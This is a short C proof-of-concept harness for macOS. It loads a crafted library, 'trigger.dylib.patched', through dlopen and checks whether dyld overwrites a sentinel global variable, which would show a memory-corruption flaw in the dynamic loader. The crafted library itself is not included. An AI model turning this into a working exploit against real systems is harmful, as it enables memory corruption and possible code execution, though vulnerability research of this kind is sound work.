// loader.c
#include <dlfcn.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

uintptr_t target_variable = 0xAAAAAAAAAAAAAAAA;

int main() {
    printf("PoC\n");
    printf("target_variable address: %p\n", &target_variable);
    printf("before dlopen: 0x%llx\n", (unsigned long long)target_variable);
    
    void* handle = dlopen("./trigger.dylib.patched", RTLD_NOW);
    
    if (!handle) {
        printf("dlopen failed.\n");
    }
    
    printf("after dlopen:  0x%llx\n", (unsigned long long)target_variable);
    
    if (target_variable != 0xAAAAAAAAAAAAAAAA) {
        printf("success! : target_variable was modified by dyld!\n");
    } else {
        printf("failed: target_variable is same.\n");
    }
    return 0;
}
